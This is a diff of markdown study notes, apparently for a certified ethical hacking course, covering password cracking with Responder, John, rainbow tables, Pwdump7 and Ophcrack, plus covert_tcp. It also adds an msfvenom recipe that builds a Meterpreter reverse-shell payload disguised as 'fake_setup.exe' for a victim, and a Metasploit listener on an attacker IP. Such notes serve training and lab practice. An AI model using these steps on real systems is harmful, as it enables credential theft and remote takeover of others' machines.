@@ -2,13 +2,13 @@
 
 ## Module 06 - System Hacking
 
-**NTLM Hash crack :**
+### **NTLM Hash crack**
 
 * esponder -I eth0
 * usr\share\responder\logs --> Responder log location
 * john /usr/share/responder/logs/ntlm.txt
 
-**Rainbow table crack using Winrtgen :**
+### **Rainbow table crack using Winrtgen**
 
 * Open winrtgen and add new table
 * Select ntlm from Hash dropdown list.
@@ -16,15 +16,25 @@
 * Select loweralpha from Charset dropdown list (it depends upon Password).
 * rcrack\_gui.exe to crack hash with rainbow table
 
-**Hash dump with Pwdump7 and crack with ophcrack :**
+### **Hash dump with Pwdump7 and crack with Ophcrack**
 
 * `wmic useraccount get name,sid` --> Get user acc names and SID
-* PwDump7.exe > c:\hashes.txt
+* PwDump7.exe > c:\hashes.txt&#x20;
 * Replace boxes in hashes.txt with relevant usernames from step 1.
 * Ophcrack.exe -> load -> PWDUMP File
 * Tables -> Vista free -> select the table directory -> crack
 
-###
+{% embed url="https://www.tarasco.org/security/pwdump_7/pwdump7.zip" %}
+pwDump7.exe : To Dump Windows Hashes
+{% endembed %}
+
+{% embed url="http://project-rainbowcrack.com/" %}
+rcrack\_gui.exe : Use Raindow Table to crack hashes
+{% endembed %}
+
+{% embed url="https://ophcrack.sourceforge.io/download.php?type=ophcrack" %}
+Ophcrack.exe : To Crack SAM Hashes to obtain clear password
+{% endembed %}
 
 ### **Perform Active Online Attack to Crack the System's Password using Responder**
 
@@ -80,3 +90,16 @@
 
 * **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
 * Wireshark (message string being send in individual packet)
+
+### Create a Reverse TCP Connection
+
+```bash
+# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵
+
+msfdb init && msfconsole ↵
+use exploit/multi/handler ↵
+set LHOST=<attacker-IP>  ↵
+set LPORT=444 ↵
+  run
+```
